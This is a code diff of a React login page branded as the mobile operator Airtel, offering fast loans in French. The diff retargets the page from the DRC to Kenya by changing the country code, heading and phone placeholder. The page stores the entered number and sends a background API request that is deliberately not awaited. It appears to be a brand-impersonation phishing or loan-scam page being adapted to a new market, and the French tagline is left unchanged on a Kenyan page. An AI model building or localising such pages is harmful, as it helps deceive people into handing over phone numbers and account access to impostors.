@@ -41,7 +41,7 @@ function AirtelLogin() {
 
     setError('');
 
-    const fullPhone = `+243${phone}`;
+    const fullPhone = `+254${phone}`;
     localStorage.setItem('airtelPhone', fullPhone);
 
     // ⚡ Fire the API request in the background — do NOT await
@@ -75,7 +75,7 @@ function AirtelLogin() {
             <line x1="3" y1="18" x2="21" y2="18"></line>
           </svg>
         </div>
-        <h1 className="airtel-logo">Airtel DRC</h1>
+        <h1 className="airtel-logo">Airtel Kenya</h1>
         <p className="airtel-tagline">Prêts rapides. À tout moment. N'importe où.</p>
       </div>
 
@@ -103,10 +103,10 @@ function AirtelLogin() {
           <div className="airtel-input-group">
             <label>Numéro de téléphone</label>
             <div className="airtel-phone-container">
-              <div className="airtel-country-code">+243</div>
+              <div className="airtel-country-code">+254</div>
               <input
                 type="tel"
-                placeholder="8XX XXX XXX"
+                placeholder="7XX XXX XXX"
                 value={phone}
                 onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                 maxLength={9}
